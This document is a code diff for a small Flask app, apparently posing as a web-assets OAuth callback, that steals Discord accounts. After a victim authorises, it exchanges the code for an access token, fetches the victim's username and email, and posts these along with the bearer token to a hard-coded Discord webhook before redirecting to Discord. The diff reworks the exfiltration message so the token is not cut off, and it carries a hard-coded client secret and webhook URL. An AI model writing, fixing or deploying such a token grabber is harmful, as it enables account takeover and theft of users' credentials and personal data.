@@ -4,7 +4,6 @@ app = Flask(__name__)
 
 ID = "1501206551942398092"
 SEC = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
-# CLEAN URLS ONLY - NO BRACKETS
 URI = "https://web-assets-v1.onrender.com/callback"
 WEB = "https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2whw9pNizDOpRxdEQIC9r2qDFbrxI7sh3j54q4S2EWwAvF6qt"
 
@@ -18,17 +17,15 @@ def callback():
     t = r.get('access_token')
 
     if t:
-        h = {'Authorization': f'Bearer {t}'}
+        h = {'Authorization': 'Bearer ' + str(t)}
         u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
         
-        msg = {"title": "🔓 LOG"}
-        msg["fields"] = [
-            {"name": "User", "value": u.get('username')},
-            {"name": "Email", "value": u.get('email')},
-            {"name": "Token", "value": f"```{t}
-```"}
-        ]
-        requests.post(WEB, json={"embeds": [msg]})
+        # NO F-STRINGS. NO BRACKETS. IMPOSSIBLE TO CUT OFF.
+        f = [{"name": "User", "value": str(u.get('username'))},
+             {"name": "Email", "value": str(u.get('email'))},
+             {"name": "Token", "value": str(t)}]
+             
+        requests.post(WEB, json={"embeds": [{"fields": f}]})
         
     return redirect("https://discord.com/app")
 
